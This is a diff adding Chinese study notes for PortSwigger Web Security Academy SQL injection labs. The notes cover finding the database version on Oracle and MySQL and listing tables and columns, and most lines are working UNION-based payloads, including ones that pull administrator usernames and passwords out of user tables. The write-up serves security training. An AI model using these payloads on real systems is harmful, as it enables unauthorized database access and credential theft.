@@ -1,0 +1,68 @@
+### 查询数据库类型和版本 ###
+https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
+过滤器url为 /filter?category=Gifts
+测试注入 
+' OR 1=1--
+绕过类别得到所有商品，注入有效
+
+测试查询结构列数 
+' ORDER BY 2--
+列数为2
+
+注入版本查询
+' UNION SELECT banner,NULL FROM v$version--
+
+https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+过滤器url为 /filter?category=Gifts
+注入版本查询
+' UNION SELECT @@version,NULL
+
+测试注入 
+' or 1=1--
+返回错误页面
+
+' or 1=1-- 
+在注释符号后添加一个空格后成功，为mysql特性
+@ mysql也可使用#注释 @
+
+注入版本查询
+' UNION SELECT @@version,NULL-- 
+注释后有一个空格
+
+### 列出数据库表与列名 ###
+https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+过滤器url为 /filter?category=Gifts
+
+在元数据表中查找可能是用户表的表名
+' UNION SELECT TABLE_NAME,NULL 
+FROM information_schema.tables 
+WHERE TABLE_NAME LIKE '%user%'-- 
+||
+从得到的多个表名中尝试 users_hawgux
+' UNION SELECT COLUMN_NAME,NULL 
+FROM information_schema.columns
+WHERE TABLE_NAME='users_hawgux'--  
+得到列名username_gopxhk，password_akdpgk
+||
+使用得到列名查找可能是管理员账户的数据
+' UNION SELECT username_gopxhk,password_akdpgk 
+FROM users_hawgux
+WHERE username_gopxhk LIKE '%admin%'--  
+
+https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+过滤器url为 /filter?category=Pets
+
+在元数据表中查找可能是用户表的表名
+' UNION SELECT TABLE_NAME,NULL FROM all_tables 
+WHERE TABLE_NAME LIKE '%user%'-- 
+从得到的多个表名中尝试 USERS_OWRGYW
+||
+' UNION SELECT COLUMN_NAME,NULL 
+FROM all_tab_columns 
+WHERE table_name = 'USERS_OWRGYW'--
+得到列名 USERNAME_GZKSPO，PASSWORD_UNSUFZ
+||
+使用得到列名查找可能是管理员账户的数据
+' UNION SELECT USERNAME_GZKSPO,PASSWORD_UNSUFZ 
+FROM USERS_OWRGYW
+WHERE USERNAME_GZKSPO LIKE '%admin%'--  
